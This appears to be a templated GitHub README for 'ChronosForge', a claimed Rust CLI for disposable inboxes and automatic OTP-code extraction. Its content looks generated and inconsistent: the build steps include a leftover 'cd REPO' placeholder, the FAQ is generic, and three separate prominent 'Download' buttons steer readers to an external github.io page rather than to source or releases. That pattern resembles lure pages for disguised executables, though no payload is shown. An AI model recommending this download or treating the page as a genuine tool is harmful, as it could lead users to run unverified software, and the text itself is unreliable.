# ChronosForge v2026 - CLI utility 2026

> **ChronosForge is a cross-platform Rust CLI for disposable inbox workflows, live message monitoring, and automatic OTP extraction, built to speed up verification-code handling in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-cartertec9559/chronosforge-v2026-cli?style=flat-square)](https://github.com/zack-cartertec9559/chronosforge-v2026-cli)

---

<p align="center">
  <a href="https://zack-cartertec9559.github.io/chronosforge-v2026-cli/">
    <img src="https://img.shields.io/badge/Download-ChronosForge%20Latest-brightgreen?style=for-the-badge" alt="Download ChronosForge">
  </a>
</p>

> **[Direct Download - ChronosForge v2026](https://zack-cartertec9559.github.io/chronosforge-v2026-cli/)**

---

[Download Latest Build](https://zack-cartertec9559.github.io/chronosforge-v2026-cli/)

---

## Overview

ChronosForge focuses on fast temporary inbox creation, real-time inbox observation, and quick pickup of verification codes with very little hands-on work. It combines a command-line flow with an optional TUI, so it fits both automation-first users and those who want to stay inside the terminal interactively.

Written in Rust and also available through a REST API, it can be wired into other tools or broader workflows without much friction. Support for multiple inboxes, message filtering, and inbox TTL controls makes it a compact option for managing short-lived email sessions and tracking OTP delivery.

---

## What you get

- Spin up disposable inboxes whenever needed
- Watch messages live as they arrive
- Automatically pull OTP and verification codes from mail content
- Handle several inboxes concurrently
- Use the REST API for external integrations
- Choose between CLI commands and the TUI
- Apply message filters to narrow inbox activity
- Set inbox TTL values for brief or extended sessions

---

## Installation

Clone the repository and build it from source:

```bash
git clone https://github.com/zack-cartertec9559/chronosforge-v2026-cli.git
cd REPO
cargo build --release
```

After building, launch the binary from the target release directory. If you are using a packaged release, download it first and run the included executable from your terminal.

---

## Usage

The usual pattern is to create a disposable inbox, keep an eye on incoming mail, and let ChronosForge identify any OTP or verification code it finds.

Typical workflow:

```bash
chronosforge inbox create
chronosforge inbox watch --id <inbox-id>
chronosforge otp extract --id <inbox-id>
```

For interactive sessions, switch to TUI mode and manage inboxes from the terminal UI. For automation, use the REST API from scripts or other tools to create inboxes, poll messages, and retrieve extracted codes.

---

## Configuration

ChronosForge relies on inbox-level settings to control temporary mail sessions. The main knobs are TTL, filtering rules, and how many inboxes you want to operate at once.

Example configuration shape:

```toml
[inbox]
ttl = 15
multi_inbox = true

[message_filter]
enabled = true
```

If you use the REST API or TUI, the same core behavior is applied through the selected interface and runtime options.

---

## Requirements

- A cross-platform environment
- Rust toolchain for building from source
- Terminal access for CLI or TUI usage
- Network access for inbox and API operations
- Enough local storage for build artifacts and runtime logs

---

## FAQ

**Can ChronosForge be used both automatically and interactively?**  
Yes. It supports CLI-driven automation as well as a terminal-based TUI.

**Is it possible to manage more than one inbox at a time?**  
Yes. Multi-inbox support lets you work with several disposable inboxes together.

**How does it deal with verification codes?**  
ChronosForge can monitor incoming messages and automatically extract OTP or verification codes from supported message content.

**Where do I adjust inbox lifetime settings?**  
Change the inbox TTL value in your configuration or runtime options.

**What should I do if the API or TUI behaves differently?**  
Check the latest build, review the current configuration, and confirm the commands against the version you are running.

**How do I stay up to date?**  
Use the latest release or build link at the top of this page to stay current with version 2026 resources.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
